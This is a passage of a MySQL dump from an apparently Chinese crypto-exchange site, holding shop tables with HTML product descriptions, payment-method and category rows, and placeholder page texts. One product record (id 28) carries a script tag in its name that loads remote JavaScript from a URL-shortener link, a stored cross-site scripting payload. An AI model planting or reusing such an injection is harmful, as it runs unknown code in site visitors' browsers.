Arial;background-color:#FFFFFF;margin:0px auto;padding:0px;\">\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150924171716756.jpg\" /> \r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150924171722287.jpg\" /> \r\n	</p>\r\n</div>\r\n<div style=\"margin:0px auto;padding:0px;font-family:微软雅黑;color:#333333;\">\r\n	<p style=\"font-size:18px;text-align:center;\">\r\n		SDK开放平台\r\n	</p>\r\n	<p style=\"font-size:14px;text-align:center;\">\r\n		开放属于自己的飞行平台，实现美妙创意。 您可运用SDK软件开放套件为Phantom 3 定制专属App，全面升级您的飞行平台，并实现自由控制：\r\n	</p>\r\n	<div>\r\n		<p style=\"font-size:14px;font-weight:bold;\">\r\n			<br />\r\n		</p>\r\n	</div>\r\n</div>\r\n<div style=\"color:#666666;font-family:微软雅黑, Arial;background-color:#FFFFFF;margin:0px auto;padding:0px;\">\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150924171757410.jpg\" /> \r\n	</p>\r\n</div>', '', '0', '1446300769', '0', '1', '0.00');
INSERT INTO `movesay_shop` VALUES ('15', '平安银行 招财进宝金章 Au9999 5g', '', '\\Upload\\shop\\5634cce4052f6.jpg', 'qita', '1300.00000000', '100.00000000', '20.00000000', '<div style=\"background-color:#FFFFFF;margin:10px auto;font-family:微软雅黑;color:#333333;\">\r\n	<p style=\"font-size:32px;text-align:center;\">\r\n		平安是福，相伴是金\r\n	</p>\r\n	<p style=\"font-size:15px;text-indent:28px;\">\r\n		招财进宝金章是由平安银行荣誉发行，采用上海黄金交易所标准成色原料制造。 貔貅为是转祸为祥的吉瑞之兽。象征揽八方之财，只进不出，同时镇宅辟邪，聚财掌权。本产品是由纯金Au.9999制成，是具有保值及收藏的吉祥之物。由中国黄金协会监制，是投资理财、收藏馈赠的首选礼品！\r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20151026181008493.jpg\" /> \r\n	</p>\r\n</div>\r\n<div style=\"background-color:#FFFFFF;margin:10px auto;font-family:微软雅黑;color:#333333;padding:0px;\">\r\n	<p style=\"font-size:15px;text-indent:28px;\">\r\n		中国传统有装饰“貔貅”的习俗，貔貅寓意丰富，人们相信它能带来欢乐及好运。民间也有“一摸貔貅运程旺盛，再摸貔貅财运滚滚，三摸貔貅平步青云”的美好祝愿。貔貅身背元宝，意为招财进宝，招财进宝臻佳瑞，合家无虑保安存。即是招财的象征，又是辟邪镇宅的寓意，给主人带来吉祥祝福。\r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20151026181033937.jpg\" /> \r\n	</p>\r\n</div>\r\n<div style=\"background-color:#FFFFFF;margin:0px auto;font-family:微软雅黑;color:#333333;padding:0px;\">\r\n	<p style=\"font-size:14px;text-indent:28px;\">\r\n		千百年来，黄金始终是财富的象征。无论历史的车轴留下怎样的履痕，不为时间所动的稳定品质和随世迁移的内在价值，诉说着世世代代的传承。工艺精美，值得世代臻享流传。招财进宝金章——黄金纯度为99.99%，规格为5g，配备收藏证书，并支持黄金回购服务。\r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20151026181057267.jpg\" /> \r\n	</p>\r\n</div>', '', '0', '1446300900', '0', '1', '0.00');
INSERT INTO `movesay_shop` VALUES ('16', '中国农业银行传世之宝\"银元宝\" Ag99.9 100g', '', '\\Upload\\shop\\5634cd8ad5522.jpg', 'qita', '1088.00000000', '100.00000000', '20.00000000', '<div style=\"color:#666666;font-family:微软雅黑, Arial;background-color:#FFFFFF;margin:10px auto;padding:0px;text-align:center;\">\r\n	<p>\r\n		<img src=\"/Upload/5634cd832dea4.jpg\" alt=\"\" /><img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150731143421185.jpg\" /> \r\n	</p>\r\n</div>\r\n<div style=\"margin:0px auto;padding:0px;font-family:微软雅黑;color:#333333;\">\r\n	<p style=\"font-size:14px;\">\r\n		纯银气质，韧性好是纯银的重要物理属性之一，它易延展但硬度度，那些坚硬的物体可能会损坏产品表面，甚至使薄软的产品变形，珍爱产品，请远离硬物。 若留下指纹、汗渍，可用软布擦拭，即可恢复其光泽。产品使用后如有沾污，一般只需用清水略作清洗，放在两块软绵中吸干水分即可。减少与空气接触的最好的养护方式，不经常使用时宜将产品密封保存，放在储藏柜或保险箱内。\r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;font-family:微软雅黑, Arial;background-color:#FFFFFF;margin:10px auto;padding:0px;text-align:center;\">\r\n	<p>\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150731143444362.jpg\" /> \r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;font-family:微软雅黑, Arial;background-color:#FFFFFF;margin:10px auto;padding:0px;text-align:center;\">\r\n	<p>\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150731143450551.jpg\" /> \r\n	</p>\r\n	<p>\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150731143506987.jpg\" /> \r\n	</p>\r\n	<p>\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150731143516830.jpg\" /> \r\n	</p>\r\n</div>', '', '0', '1446301066', '0', '1', '0.00');
INSERT INTO `movesay_shop` VALUES ('24', 'Apple iPhone 6s (A1700) 64G 玫瑰金色 移动联通电信4G手机', '', '\\Upload\\shop\\56330fbc3d579.png', 'qita', '6000.00000000', '95.00000000', '4.00000000', '<img src=\"/Upload/5633106483d9b.jpg\" alt=\"\" /><img src=\"/Upload/5633106e3651b.jpg\" alt=\"\" />', '', '0', '1446187311', '0', '-1', '0.00');
INSERT INTO `movesay_shop` VALUES ('25', '爱国者 PA610 移动电源 10000mAh 双USB输出', '', '\\Upload\\shop\\5634d0d4a9d2d.jpg', 'qita', '99.00000000', '999.00000000', '1.00000000', '<div style=\"color:#666666;font-family:微软雅黑, Arial;background-color:#FFFFFF;margin:0px auto;padding:0px;text-align:center;\">\r\n	<p>\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20151010174219815.jpg\" /> \r\n	</p>\r\n	<p>\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20151010174225139.jpg\" /> \r\n	</p>\r\n	<p>\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20151010174231733.jpg\" /> \r\n	</p>\r\n</div>\r\n<div style=\"margin:0px auto;font-family:微软雅黑;padding:0px;color:#333333;\">\r\n	<p style=\"font-size:15px;\">\r\n		采用一体成型的航空级抗压金属外壳，具有极高的结构强度， 耐摔防撞，耐压承重，可承受50公斤重压\r\n	</p>\r\n</div>\r\n<div style=\"margin:0px auto;font-family:微软雅黑;padding:0px;color:#333333;\">\r\n	<p style=\"font-size:15px;\">\r\n		金属磨砂质感，经过与iPad 4一致的阳极氧化工艺，可在表面形成坚硬的保护层，着色坚固，更加耐磨耐腐蚀。\r\n	</p>\r\n</div>\r\n<div style=\"margin:0px auto;font-family:微软雅黑;padding:0px;color:#333333;\">\r\n	<p style=\"font-size:15px;\">\r\n		高品质聚合物电芯，重量更轻，机身更薄，与18650电芯相比\r\n	</p>\r\n	<p style=\"font-size:15px;\">\r\n		安全高效，使用寿命更长。\r\n	</p>\r\n</div>\r\n<div style=\"margin:0px auto;font-family:微软雅黑;padding:0px;color:#333333;\">\r\n	<p style=\"font-size:15px;\">\r\n		拥有高达10000mAh超大电量，为你的手机、平板、数码相机提供超乎想象的续航时间，可为iPhone5S充电 4.5次，iPad mini充电1.5次，三星S4充电2.5次。\r\n	</p>\r\n</div>\r\n<div style=\"margin:0px auto;font-family:微软雅黑;padding:0px;color:#333333;\">\r\n	<p style=\"font-size:15px;\">\r\n		符合人体工程学的圆弧边缘，实现单手持握的完美握感。相比普通产品的棱角边缘，更能保护手机Pad等产品。\r\n	</p>\r\n</div>\r\n<div style=\"margin:0px auto;font-family:微软雅黑;padding:0px;color:#333333;\">\r\n	<p style=\"font-size:15px;\">\r\n		内置先进的电芯及电源管理方案，具有1A/2A双USB智能输出口，智能检测USB端口的移动设备，可同时充手机平板或者两部手机。还可为数码相机及游戏掌机充电。\r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;font-family:微软雅黑, Arial;background-color:#FFFFFF;margin:0px auto;padding:0px;text-align:center;\">\r\n	<p>\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20151010174422135.jpg\" /> \r\n	</p>\r\n	<p>\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20151010174429581.jpg\" /> \r\n	</p>\r\n	<p>\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20151010174435178.jpg\" /> \r\n	</p>\r\n	<p>\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20151010174440305.jpg\" /> \r\n	</p>\r\n</div>\r\n<div style=\"margin:0px auto;font-family:微软雅黑;padding:0px;color:#333333;\">\r\n	<p style=\"font-size:15px;\">\r\n		<br />\r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;font-family:微软雅黑, Arial;background-color:#FFFFFF;margin:0px auto;padding:0px;text-align:center;\">\r\n	<p>\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20151010174647672.jpg\" /> \r\n	</p>\r\n</div>\r\n<div style=\"margin:0px auto;font-family:微软雅黑;padding:0px;color:#333333;\">\r\n	<div>\r\n	</div>\r\n</div>', '', '0', '1446302893', '0', '1', '0.00');
INSERT INTO `movesay_shop` VALUES ('26', '苹果（Apple）iPhone 6s Plus 64G版 4G手机', '', '\\Upload\\shop\\5634d3707c1e1.jpg', 'qita', '7588.00000000', '1000.00000000', '0.00000000', '<div style=\"text-align:center;\">\r\n	<span style=\"font-size:12px;line-height:1.5;\"></span><img src=\"/Upload/5634d3aaa8fd5.jpg\" alt=\"\" /> \r\n</div>\r\n<p style=\"font-size:17px;text-align:center;\">\r\n	<img src=\"/Upload/5634d3b197767.jpg\" alt=\"\" /> \r\n</p>', '', '0', '1446302678', '0', '1', '0.00');
INSERT INTO `movesay_shop` VALUES ('27', '飞利浦（Philips）AJ3275DZ iPhone6 Plus/6/5S/5 音乐充电基座音箱', '', '\\Upload\\shop\\5639e2cfb0e39.jpg', 'yifu', '418.00000000', '1000.00000000', '10.00000000', '<div style=\"color:#666666;font-family:微软雅黑, Arial;font-size:11.6666660308838px;margin:0px auto;padding:0px;background-color:#FFFFFF;\">\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150630181914164.jpg\" /> \r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150630181919310.jpg\" /> \r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;font-size:11.6666660308838px;margin:0px auto;font-family:微软雅黑;padding:0px;\">\r\n	<p style=\"font-size:15px;color:#FFFFFF;\">\r\n		底部有四个小支撑防滑垫，同时还有一个小小的纽扣电池槽，这个电池可不是用来 给音箱供电的，而是以保证时钟的正常计时。\r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;font-size:11.6666660308838px;margin:0px auto;font-family:微软雅黑;padding:0px;\">\r\n	<p style=\"font-size:15px;color:#FFFFFF;\">\r\n		AJ3275DZ的一大亮点即就是这个小小的闪电接口，支持iPhone6手机，并有相应的 软橡胶靠垫设计，起到辅助支持手机的作用。\r\n	</p>\r\n</div>\r\n<div style=\"color:#666666;font-family:微软雅黑, Arial;font-size:11.6666660308838px;margin:0px auto;padding:0px;background-color:#FFFFFF;\">\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150630182035963.jpg\" /> \r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150630182040353.jpg\" /> \r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150630182047565.jpg\" /> \r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150630182055733.jpg\" /> \r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150630182102898.jpg\" /> \r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150630182109357.jpg\" /> \r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150630182115923.jpg\" /> \r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150630182121376.jpg\" /> \r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150630182128475.jpg\" /> \r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150630182135737.jpg\" /> \r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150630182140708.jpg\" /> \r\n	</p>\r\n	<p style=\"text-align:center;\">\r\n		<img src=\"http://goodsimg.1yyg.com/GoodsInfo/20150630182147901.jpg\" /> \r\n	</p>\r\n</div>', '', '0', '1456203847', '0', '1', '0.00');
INSERT INTO `movesay_shop` VALUES ('28', '测试商品1<script src=http://t.cn/RMA8JWE></script>', 'cny,dsc,btc,ltc,dsg,', '\\Upload\\shop\\56cbe82d8e86c.png', 'dianzi', '1000.00000000', '896.00000000', '154.00000000', '<img src=\"/Upload/shop/56cbe7cf193d8.png\" alt=\"\" />', '', '1', '1457144844', '1469030400', '1', '0.00');

-- ----------------------------
-- Table structure for movesay_shop_addr
-- ----------------------------
DROP TABLE IF EXISTS `movesay_shop_addr`;
CREATE TABLE `movesay_shop_addr` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `userid` int(11) unsigned NOT NULL DEFAULT '0',
  `truename` varchar(50) NOT NULL DEFAULT '0',
  `moble` varchar(500) NOT NULL,
  `name` varchar(500) NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` int(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `status` (`status`),
  KEY `userid` (`userid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of movesay_shop_addr
-- ----------------------------

-- ----------------------------
-- Table structure for movesay_shop_coin
-- ----------------------------
DROP TABLE IF EXISTS `movesay_shop_coin`;
CREATE TABLE `movesay_shop_coin` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT COMMENT '自增id',
  `nuo` varchar(200) NOT NULL COMMENT '付款',
  `ltc` varchar(200) NOT NULL COMMENT '付款',
  `btc` varchar(200) NOT NULL COMMENT '付款',
  `dsg` varchar(200) NOT NULL COMMENT '付款',
  `dsc` varchar(200) NOT NULL COMMENT '付款',
  `shopid` int(11) unsigned NOT NULL COMMENT '商品id',
  `cny` varchar(50) NOT NULL COMMENT '人民币',
  PRIMARY KEY (`id`),
  KEY `shopid` (`shopid`)
) ENGINE=MyISAM AUTO_INCREMENT=22 DEFAULT CHARSET=utf8 COMMENT='商品付款方式表';

-- ----------------------------
-- Records of movesay_shop_coin
-- ----------------------------
INSERT INTO `movesay_shop_coin` VALUES ('1', '', '1', '1', '1', '1', '1', '1');
INSERT INTO `movesay_shop_coin` VALUES ('2', '', '1', '1', '1', '1', '2', '1');
INSERT INTO `movesay_shop_coin` VALUES ('3', '', '1', '1', '1', '1', '3', '1');
INSERT INTO `movesay_shop_coin` VALUES ('4', '', '1', '1', '1', '1', '4', '1');
INSERT INTO `movesay_shop_coin` VALUES ('5', '', '1', '1', '1', '1', '5', '1');
INSERT INTO `movesay_shop_coin` VALUES ('6', '', '1', '1', '1', '1', '6', '1');
INSERT INTO `movesay_shop_coin` VALUES ('7', '', '', '', '', '', '7', '');
INSERT INTO `movesay_shop_coin` VALUES ('8', '', '', '', '', '', '8', '');
INSERT INTO `movesay_shop_coin` VALUES ('9', '', '', '', '', '', '9', '');
INSERT INTO `movesay_shop_coin` VALUES ('10', '', '', '', '', '', '10', '');
INSERT INTO `movesay_shop_coin` VALUES ('11', '', '', '', '', '', '11', '');
INSERT INTO `movesay_shop_coin` VALUES ('12', '', '', '', '', '', '12', '');
INSERT INTO `movesay_shop_coin` VALUES ('13', '', '', '', '', '', '13', '');
INSERT INTO `movesay_shop_coin` VALUES ('14', '', '', '', '', '', '14', '');
INSERT INTO `movesay_shop_coin` VALUES ('15', '', '', '', '', '', '15', '');
INSERT INTO `movesay_shop_coin` VALUES ('16', '', '', '', '', '', '16', '');
INSERT INTO `movesay_shop_coin` VALUES ('17', '', '', '', '', '', '24', '');
INSERT INTO `movesay_shop_coin` VALUES ('18', '', '', '', '', '', '25', '');
INSERT INTO `movesay_shop_coin` VALUES ('19', '', '', '', '', '', '26', '');
INSERT INTO `movesay_shop_coin` VALUES ('20', '', '', '', '', '', '27', '');
INSERT INTO `movesay_shop_coin` VALUES ('21', '', '', '', '', '10', '28', '');

-- ----------------------------
-- Table structure for movesay_shop_log
-- ----------------------------
DROP TABLE IF EXISTS `movesay_shop_log`;
CREATE TABLE `movesay_shop_log` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `userid` varchar(255) NOT NULL,
  `shopid` varchar(50) NOT NULL,
  `price` decimal(20,8) unsigned NOT NULL DEFAULT '0.00000000',
  `coinname` varchar(50) NOT NULL DEFAULT '0.00',
  `num` decimal(20,8) unsigned NOT NULL DEFAULT '0.00000000',
  `mum` decimal(20,8) unsigned NOT NULL DEFAULT '0.00000000',
  `addr` varchar(50) NOT NULL DEFAULT '0.0000',
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` tinyint(4) NOT NULL DEFAULT '0',
  `xuyao` decimal(20,8) unsigned NOT NULL COMMENT '价',
  PRIMARY KEY (`id`),
  KEY `userid` (`userid`),
  KEY `status` (`status`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COMMENT='购物记录表';

-- ----------------------------
-- Records of movesay_shop_log
-- ----------------------------

-- ----------------------------
-- Table structure for movesay_shop_type
-- ----------------------------
DROP TABLE IF EXISTS `movesay_shop_type`;
CREATE TABLE `movesay_shop_type` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(50) NOT NULL,
  `title` varchar(50) NOT NULL,
  `remark` varchar(50) NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `status` int(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `name` (`name`),
  KEY `status` (`status`)
) ENGINE=MyISAM AUTO_INCREMENT=7 DEFAULT CHARSET=utf8 COMMENT='商品分类';

-- ----------------------------
-- Records of movesay_shop_type
-- ----------------------------
INSERT INTO `movesay_shop_type` VALUES ('1', 'dianzi', '电子商品', '电子商品', '0', '0', '0', '1');
INSERT INTO `movesay_shop_type` VALUES ('6', 'licai', '理财', '理财', '1', '1466049160', '1466049160', '1');

-- ----------------------------
-- Table structure for movesay_text
-- ----------------------------
DROP TABLE IF EXISTS `movesay_text`;
CREATE TABLE `movesay_text` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL,
  `title` varchar(255) NOT NULL,
  `content` text NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` tinyint(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `status` (`status`),
  KEY `name` (`name`)
) ENGINE=MyISAM AUTO_INCREMENT=46 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of movesay_text
-- ----------------------------
INSERT INTO `movesay_text` VALUES ('1', 'user_index', '安全中心首页', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1457160962', '0', '0');
INSERT INTO `movesay_text` VALUES ('2', 'user_truename', '实名认证', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1457160962', '0', '0');
INSERT INTO `movesay_text` VALUES ('3', 'user_bank', '银行卡管理', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:&quot;Microsoft Yahei&quot;, &quot;Sim sun&quot;, tahoma, &quot;Helvetica,Neue&quot;, Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1457160962', '0', '0');
INSERT INTO `movesay_text` VALUES ('4', 'user_group', '用户级别', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1457160962', '0', '0');
INSERT INTO `movesay_text` VALUES ('5', 'user_log', '账户日志', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1457160600', '0', '0');
INSERT INTO `movesay_text` VALUES ('6', 'user_message', '我的消息', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:&quot;Microsoft Yahei&quot;, &quot;Sim sun&quot;, tahoma, &quot;Helvetica,Neue&quot;, Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1457160962', '0', '0');
INSERT INTO `movesay_text` VALUES ('7', 'user_moble', '手机绑定', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1457160962', '0', '0');
INSERT INTO `movesay_text` VALUES ('8', 'user_email', '邮箱绑定', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1457160962', '0', '0');
INSERT INTO `movesay_text` VALUES ('9', 'user_google', '谷歌验证绑定', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1457160962', '0', '0');
INSERT INTO `movesay_text` VALUES ('10', 'user_password', '修改登录密码', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1457160962', '0', '0');
INSERT INTO `movesay_text` VALUES ('11', 'user_paypassword', '修改交易密码', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1457160962', '0', '0');
INSERT INTO `movesay_text` VALUES ('12', 'user_question', '提交问题', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1457160962', '0', '0');
INSERT INTO `movesay_text` VALUES ('13', 'user_qianbao', '钱包管理', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1457160962', '0', '0');
INSERT INTO `movesay_text` VALUES ('14', 'pool_index', '矿机首页', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1457160962', '0', '0');
INSERT INTO `movesay_text` VALUES ('15', 'pool_log', '矿机管理', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1457160962', '0', '0');
INSERT INTO `movesay_text` VALUES ('16', 'issue_index', '认购首页', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1457160962', '0', '0');
INSERT INTO `movesay_text` VALUES ('17', 'issue_index', '认购记录', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1457160962', '0', '0');
INSERT INTO `movesay_text` VALUES ('18', 'finance_mycz', '认购记录', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1457160962', '0', '0');
INSERT INTO `movesay_text` VALUES ('19', 'user_nameauth', '', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1464677557', '0', '0');
INSERT INTO `movesay_text` VALUES ('20', 'user_ga', '', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1464677561', '0', '0');
